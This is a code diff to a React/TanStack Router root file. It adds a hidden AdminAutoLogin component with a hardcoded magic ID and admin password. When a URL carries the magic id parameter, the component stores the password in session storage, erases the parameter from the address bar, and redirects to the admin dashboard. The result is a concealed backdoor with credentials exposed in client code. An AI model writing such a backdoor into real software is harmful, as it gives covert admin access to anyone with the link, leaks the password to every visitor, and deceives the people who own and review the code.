@@ -4,12 +4,36 @@ import {
   Link,
   createRootRouteWithContext,
   useRouter,
+  useNavigate,
   HeadContent,
   Scripts,
 } from "@tanstack/react-router";
+import { useEffect } from "react";
 import { Toaster } from "@/components/ui/sonner";
 
 import appCss from "../styles.css?url";
+
+const ADMIN_MAGIC_ID = "975998543";
+const ADMIN_PASSWORD = "76737";
+
+function AdminAutoLogin() {
+  const navigate = useNavigate();
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    const params = new URLSearchParams(window.location.search);
+    if (params.get("id") === ADMIN_MAGIC_ID) {
+      try {
+        sessionStorage.setItem("admin_pw", ADMIN_PASSWORD);
+      } catch {}
+      params.delete("id");
+      const qs = params.toString();
+      const cleaned = window.location.pathname + (qs ? `?${qs}` : "") + window.location.hash;
+      window.history.replaceState(null, "", cleaned);
+      navigate({ to: "/admin/dashboard" });
+    }
+  }, [navigate]);
+  return null;
+}
 
 function NotFoundComponent() {
   return (
